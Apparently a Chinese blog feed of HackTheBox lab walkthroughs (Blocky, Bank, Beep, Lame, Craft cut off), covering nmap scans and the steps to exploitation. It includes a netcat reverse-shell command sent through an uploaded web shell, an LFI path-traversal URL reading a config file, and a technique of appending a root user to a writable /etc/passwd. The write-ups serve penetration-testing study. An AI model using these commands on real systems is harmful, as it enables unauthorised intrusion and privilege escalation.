    <content type="html"><![CDATA[<p>java反编译包<a id="more"></a></p><img src="/2021/03/08/blocky-hackthebox/6.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本机：10.10.14.38</span><br><span class="line">靶机：10.10.10.37</span><br></pre></td></tr></table></figure><h3 id="nmap扫描端口"><a href="#nmap扫描端口" class="headerlink" title="nmap扫描端口"></a>nmap扫描端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sC -sV -oA nmap/blocky 10.10.10.37</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># Nmap 7.91 scan initiated Mon Mar  8 13:31:55 2021 as: nmap -v -sC -sV -oA nmap/blocky 10.10.10.37</span></span><br><span class="line">Nmap scan report for 10.10.10.37</span><br><span class="line">Host is up (0.33s latency).</span><br><span class="line">Not shown: 996 filtered ports</span><br><span class="line">PORT     STATE  SERVICE VERSION</span><br><span class="line">21/tcp   open   ftp     ProFTPD 1.3.5a</span><br><span class="line">22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)</span><br><span class="line">|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)</span><br><span class="line">|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)</span><br><span class="line">80/tcp   open   http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-generator: WordPress 4.8</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: BlockyCraft &amp;#8211; Under Construction!</span><br><span class="line">8192/tcp closed sophos</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="section"># Nmap done at Mon Mar  8 13:33:03 2021 -- 1 IP address (1 host up) scanned in 67.93 seconds</span></span><br></pre></td></tr></table></figure><p>21端口——ftp</p><p>22端口——ssh</p><p>80端口——apache 运行wordpress框架</p><p>8192——不太清楚</p><p>web页面没有发现什么信息，wordpress应该是有一个后台登录路径的，gobuster爆破一下路径</p><h3 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.37  -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -o gobuster/blocky</span><br></pre></td></tr></table></figure><img src="/2021/03/08/blocky-hackthebox/1.png" class=""><p><code>/wp-includes</code>路径下列出了所有的文件，但是打开看不到内容</p><p><code>/wp-admin</code>跳转到管理员登录界面，尝试弱密码，没有用</p><p><code>/plugins</code>路径下本应该有两个jar包，但是环境好像出问题了，借用视频的图</p><img src="/2021/03/08/blocky-hackthebox/2.png" class=""><p>下载之后反编译jar包</p><img src="/2021/03/08/blocky-hackthebox/3.png" class=""><p>可以看到给出了root的密码</p><h3 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h3><p>用root账户的密码登录phpadmin，在wordpress数据库中的wp_users表中找到了一个用户</p><img src="/2021/03/08/blocky-hackthebox/7.png" class=""><h3 id="user权限"><a href="#user权限" class="headerlink" title="user权限"></a>user权限</h3><p>ssh连接上面数据库中查到的用户</p><img src="/2021/03/08/blocky-hackthebox/4.png" class=""><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>sudo直接切换，那串密码也是root的密码</p><img src="/2021/03/08/blocky-hackthebox/5.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;java反编译包
    
    </summary>
    
    
    
      <category term="渗透easy" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8Feasy/"/>
    
  </entry>
  
  <entry>
    <title>bank-hackthebox</title>
    <link href="http://yoursite.com/2021/03/07/bank-hackthebox/"/>
    <id>http://yoursite.com/2021/03/07/bank-hackthebox/</id>
    <published>2021-03-07T02:12:30.000Z</published>
    <updated>2021-03-07T12:43:18.022Z</updated>
    
    <content type="html"><![CDATA[<p>dns相关的知识和工具使用第一次接触，学到了<a id="more"></a></p><img src="/2021/03/07/bank-hackthebox/13.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本机：10.10.14.38</span><br><span class="line">靶机：10.10.10.29</span><br></pre></td></tr></table></figure><h3 id="nmap扫描端口"><a href="#nmap扫描端口" class="headerlink" title="nmap扫描端口"></a>nmap扫描端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sC -sV -oA nmap/bank 10.10.10.29</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># Nmap 7.91 scan initiated Sun Mar  7 09:43:25 2021 as: nmap -v -sC -sV -oA nmap/bank 10.10.10.29</span></span><br><span class="line">Nmap scan report for 10.10.10.29</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)</span><br><span class="line">|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)</span><br><span class="line">|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)</span><br><span class="line">|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)</span><br><span class="line">53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: POST OPTIONS GET HEAD</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="section"># Nmap done at Sun Mar  7 09:44:03 2021 -- 1 IP address (1 host up) scanned in 37.67 seconds</span></span><br></pre></td></tr></table></figure><p>22端口——ssh</p><p>53端口——dns</p><p>80端口——http（apache）</p><p>访问<code>10.10.10.29</code>,只是一个apache服务启动的默认页面，22端口是ssh没法下手，从53端口入手</p><h3 id="dns"><a href="#dns" class="headerlink" title="dns"></a>dns</h3><p>nslookup、dnsrecon、dig都是DNS侦察工具，能够从DNS服务器返回的记录中获取更多的信息，这里主要用dig</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig axfr @10.10.10.29 bank.htb</span><br></pre></td></tr></table></figure><img src="/2021/03/07/bank-hackthebox/1.png" class=""><p>全部加入<code>/etc/hosts</code>中</p><p>访问，需要登录，尝试sql注入，失败</p><h3 id="dirsearch路径爆破"><a href="#dirsearch路径爆破" class="headerlink" title="dirsearch路径爆破"></a>dirsearch路径爆破</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u http://bank.htb</span><br></pre></td></tr></table></figure><img src="/2021/03/07/bank-hackthebox/2.png" class=""><p>没有爆破完，看到uploads文件夹，应该就是利用文件上传漏洞写shell了</p><p>可以看到index.php和support.php都是跳转到login.php的，由于burp的原因没办法测试，实际上support.php页面的状态返回码改成200 OK再转发包出去就能跳转到上传界面</p><p>这里知道会出现302状态码，加入一条正则匹配响应头进行替换即可，再忽略重定向即可避开跳转到login.php</p><img src="/2021/03/07/bank-hackthebox/3.png" class=""><h3 id="文件上传getshell"><a href="#文件上传getshell" class="headerlink" title="文件上传getshell"></a>文件上传getshell</h3><p>这里有一个细节问题，在网页源码里给了提示</p><img src="/2021/03/07/bank-hackthebox/4.png" class=""><p>htb结尾的文件会被当作php进行解析，所以要上传htb结尾的shell</p><p>上传之后反弹shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=system("nc -e /bin/sh 10.10.14.38 9001");</span><br></pre></td></tr></table></figure><p>交互式shell</p><img src="/2021/03/07/bank-hackthebox/5.png" class=""><h3 id="user权限"><a href="#user权限" class="headerlink" title="user权限"></a>user权限</h3><p>find查找user.txt路径，在<code>/home/chris/user.txt</code>下</p><img src="/2021/03/07/bank-hackthebox/6.png" class=""><h3 id="root权限"><a href="#root权限" class="headerlink" title="root权限"></a>root权限</h3><p>上linpeas自动分析可能存在的漏洞点</p><img src="/2021/03/07/bank-hackthebox/7.png" class=""><p>可以看到允许root用户登录</p><img src="/2021/03/07/bank-hackthebox/8.png" class=""><p><code>/etc/passwd</code>具有可写的权限，正常情况下是只有root用户具有写的权限</p><img src="/2021/03/07/bank-hackthebox/9.png" class=""><p>这里发现了一个不太寻常的文件，并且能够执行，可能是root赋予其他用户，在紧急时运行这个程序可以拥有root控制权，执行后成功有了root控制权</p><img src="/2021/03/07/bank-hackthebox/10.png" class=""><p>这里还有一种方法，因为<code>/etc/passwd</code>任意用户可写，可以利用这个进行提权,<a href="https://www.cnblogs.com/linuxsec/articles/11372740.html）" target="_blank" rel="noopener"><code>/etc/passwd</code>可写提权</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">步骤</span><br><span class="line">perl -le ‘print crypt(“Password@973″,”addedsalt”)’//生成加密密码</span><br><span class="line">echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" &gt;&gt; /etc/passwd//写入文件</span><br><span class="line">python -c 'import pty; pty.spawn("/bin/bash")'//提权，su登录时会提醒在终端进行</span><br></pre></td></tr></table></figure><img src="/2021/03/07/bank-hackthebox/11.png" class=""><p>可以看到成功添加了Tom用户并且为root用户组</p><img src="/2021/03/07/bank-hackthebox/12.png" class=""><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>学习了<code>/etc/passwd</code>任意用户可写提权的方法</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;dns相关的知识和工具使用第一次接触，学到了
    
    </summary>
    
    
    
      <category term="渗透easy" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8Feasy/"/>
    
  </entry>
  
  <entry>
    <title>beep-hackthebox</title>
    <link href="http://yoursite.com/2021/03/06/beep-hackthebox/"/>
    <id>http://yoursite.com/2021/03/06/beep-hackthebox/</id>
    <published>2021-03-06T13:53:19.000Z</published>
    <updated>2021-03-07T02:13:23.421Z</updated>
    
    <content type="html"><![CDATA[<p>接下来以easy靶机为主，学习一些不同的基础渗透知识，快速过一遍之后再来做meduim靶机<a id="more"></a></p><img src="/2021/03/06/beep-hackthebox/1.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机：10.10.10.7</span><br><span class="line">本机：10.10.14.38</span><br></pre></td></tr></table></figure><h3 id="nmap扫描端口"><a href="#nmap扫描端口" class="headerlink" title="nmap扫描端口"></a>nmap扫描端口</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sC -sV -oA nmap/Beep 10.10.10.7</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># Nmap 7.91 scan initiated Sat Mar  6 19:21:55 2021 as: nmap -v -sC -sV -oA nmap/Beep 10.10.10.7</span></span><br><span class="line">Nmap scan report for 10.10.10.7</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line">Not shown: 988 closed ports</span><br><span class="line">PORT      STATE SERVICE    VERSION</span><br><span class="line">22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)</span><br><span class="line">|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)</span><br><span class="line">25/tcp    open  smtp       Postfix smtpd</span><br><span class="line">|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, </span><br><span class="line">80/tcp    open  http       Apache httpd 2.2.3</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.2.3 (CentOS)</span><br><span class="line">|_http-title: Did not follow redirect to https://10.10.10.7/</span><br><span class="line">110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4</span><br><span class="line">|_pop3-capabilities: LOGIN-DELAY(0) UIDL TOP RESP-CODES APOP PIPELINING EXPIRE(NEVER) IMPLEMENTATION(Cyrus POP3 server v2) USER AUTH-RESP-CODE STLS</span><br><span class="line">111/tcp   open  rpcbind    2 (RPC #100000)</span><br><span class="line">143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4</span><br><span class="line">|_imap-capabilities: Completed OK URLAUTHA0001 BINARY IDLE ACL LISTEXT RENAME ANNOTATEMORE STARTTLS MULTIAPPEND LITERAL+ X-NETSCAPE MAILBOX-REFERRALS ID SORT=MODSEQ UNSELECT THREAD=REFERENCES QUOTA THREAD=ORDEREDSUBJECT RIGHTS=kxte IMAP4 CONDSTORE NAMESPACE CATENATE LIST-SUBSCRIBED CHILDREN NO SORT UIDPLUS ATOMIC IMAP4rev1</span><br><span class="line">443/tcp   open  ssl/https?</span><br><span class="line">| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--</span><br><span class="line">| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 1024</span><br><span class="line">| Signature Algorithm: sha1WithRSAEncryption</span><br><span class="line">| Not valid before: 2017-04-07T08:22:08</span><br><span class="line">| Not valid after:  2018-04-07T08:22:08</span><br><span class="line">| MD5:   621a 82b6 cf7e 1afa 5284 1c91 60c8 fbc8</span><br><span class="line">|_SHA-1: 800a c6e7 065e 1198 0187 c452 0d9b 18ef e557 a09f</span><br><span class="line">|_ssl-date: 2021-03-06T12:27:47+00:00; +1h00m33s from scanner time.</span><br><span class="line">993/tcp   open  ssl/imap   Cyrus imapd</span><br><span class="line">995/tcp   open  pop3s?</span><br><span class="line">3306/tcp  open  mysql      MySQL (unauthorized)</span><br><span class="line">|_ssl-cert: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_ssl-date: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_sslv2: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_tls-alpn: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">4445/tcp  open  upnotifyp?</span><br><span class="line">10000/tcp open  http       MiniServ 1.570 (Webmin httpd)</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 74F7F6F633A027FA3EA36F05004C9341</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST</span><br><span class="line">|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).</span><br><span class="line">|_http-trane-info: Problem with XML parsing of /evox/about</span><br><span class="line">Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 1h00m32s</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="section"># Nmap done at Sat Mar  6 19:30:39 2021 -- 1 IP address (1 host up) scanned in 524.40 seconds</span></span><br></pre></td></tr></table></figure><p>开放了很多很多端口，暂时不知道哪个端口可能存在漏洞，看一下网站</p><p>是一个elastix服务的网站</p><img src="/2021/03/06/beep-hackthebox/2.png" class=""><h3 id="检索漏洞"><a href="#检索漏洞" class="headerlink" title="检索漏洞"></a>检索漏洞</h3><p>google查找elastix相关的漏洞，也可以searchexploit查找有无相关的漏洞</p><img src="/2021/03/06/beep-hackthebox/3.png" class=""><p>找到了之后查看具体的exp</p><img src="/2021/03/06/beep-hackthebox/4.png" class=""><p>访问<code>view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action</code>能够看到信息有序地排列，可以找到admin权限对应的密码</p><img src="/2021/03/06/beep-hackthebox/5.png" class=""><p>接下来可以尝试ssh连接，这里注意一点，就是kali的ssh配置文件要更改不然会出问题连不上</p><img src="/2021/03/06/beep-hackthebox/6.png" class=""><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><img src="/2021/03/06/beep-hackthebox/7.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;接下来以easy靶机为主，学习一些不同的基础渗透知识，快速过一遍之后再来做meduim靶机
    
    </summary>
    
    
    
      <category term="渗透easy" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8Feasy/"/>
    
  </entry>
  
  <entry>
    <title>lame-hackthebox</title>
    <link href="http://yoursite.com/2021/03/05/lame-hackthebox/"/>
    <id>http://yoursite.com/2021/03/05/lame-hackthebox/</id>
    <published>2021-03-05T15:10:29.000Z</published>
    <updated>2021-03-06T13:45:59.819Z</updated>
    
    <content type="html"><![CDATA[<p>直接看题，很简单<a id="more"></a></p><img src="/2021/03/05/lame-hackthebox/7.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本机：10.10.14.38</span><br><span class="line">靶机：10.10.10.3</span><br></pre></td></tr></table></figure><h3 id="nmap探测端口"><a href="#nmap探测端口" class="headerlink" title="nmap探测端口"></a>nmap探测端口</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sC -sV -oA nmap/lame 10.10.10.3</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.91 scan initiated Fri Mar  5 19:50:00 2021 as: nmap -v -sC -sV -oA nmap/lame 10.10.10.3</span><br><span class="line">Nmap scan report for 10.10.10.3</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line">Not shown: 996 filtered ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">21/tcp  open  ftp         vsftpd 2.3.4</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 10.10.14.38</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      vsFTPd 2.3.4 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)</span><br><span class="line">|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 2h30m12s, deviation: 3h32m09s, median: 11s</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Unix (Samba 3.0.20-Debian)</span><br><span class="line">|   Computer name: lame</span><br><span class="line">|   NetBIOS computer name: </span><br><span class="line">|   Domain name: hackthebox.gr</span><br><span class="line">|   FQDN: lame.hackthebox.gr</span><br><span class="line">|_  System time: 2021-03-05T06:50:47-05:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: <span class="tag">&lt;<span class="name">blank</span>&gt;</span></span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"># Nmap done at Fri Mar  5 19:51:15 2021 -- 1 IP address (1 host up) scanned in 74.55 seconds</span><br></pre></td></tr></table></figure><p>21端口：ftp服务</p><p>445端口：Samba 3.0.20</p><p>22端口：ssh</p><h3 id="ftp匿名登录"><a href="#ftp匿名登录" class="headerlink" title="ftp匿名登录"></a>ftp匿名登录</h3><p>ftp可以匿名登录，用户名anonymous,无密码</p> <img src="/2021/03/05/lame-hackthebox/1.png" class=""><p>查看当前目录和根目录下的文件，都是空的</p> <img src="/2021/03/05/lame-hackthebox/2.png" class=""><p>这条路走不通，看看445端口</p><h3 id="samba漏洞"><a href="#samba漏洞" class="headerlink" title="samba漏洞"></a>samba漏洞</h3><p>用searchsploit模块查找有关samba的漏洞信息</p> <img src="/2021/03/05/lame-hackthebox/3.png" class=""><p>启用msfconsole，查找具体的<code>samba 3.0.20</code>版本modules</p><img src="/2021/03/05/lame-hackthebox/4.png" class=""><p>使用这个模块，更改LHOST和RHOSTS即可，然后run一下就能弹回shell</p><img src="/2021/03/05/lame-hackthebox/5.png" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span></span><br><span class="line">提权获得交互式shell</span><br></pre></td></tr></table></figure><p>用find命令找到user.txt,root.txt就在根目录的root文件夹下</p><img src="/2021/03/05/lame-hackthebox/6.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;直接看题，很简单
    
    </summary>
    
    
    
      <category term="渗透easy" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8Feasy/"/>
    
  </entry>
  
  <entry>
    <title>Craft-hackthebox</title>
    <link href="http://yoursite.com/2021/03/05/Craft-hackthebox/"/>
    <id>http://yoursite.com/2021/03/05/Craft-hackthebox/</id>
    <published>2021-03-05T01:25:47.000Z</published>
    <updated>2021-03-06T13:47:26.964Z</updated>
    
    <content type="html"><![CDATA[<p>这是一台有关python的靶机，学习新知识点为主<a id="more"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本机：10.10.14.38</span><br><span class="line">靶机：10.10.10.110</span><br></pre></td></tr></table></figure><h3 id="nmap探端口"><a href="#nmap探端口" class="headerlink" title="nmap探端口"></a>nmap探端口</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sC -sV -oA nmap/craft 10.10.10.110</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.91 scan initiated Fri Mar  5 09:15:49 2021 as: nmap -v -sC -sV -oA nmap&#x2F;craft 10.10.10.110</span><br><span class="line">Nmap scan report for 10.10.10.110</span><br><span class="line">Host is up (0.33s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22&#x2F;tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 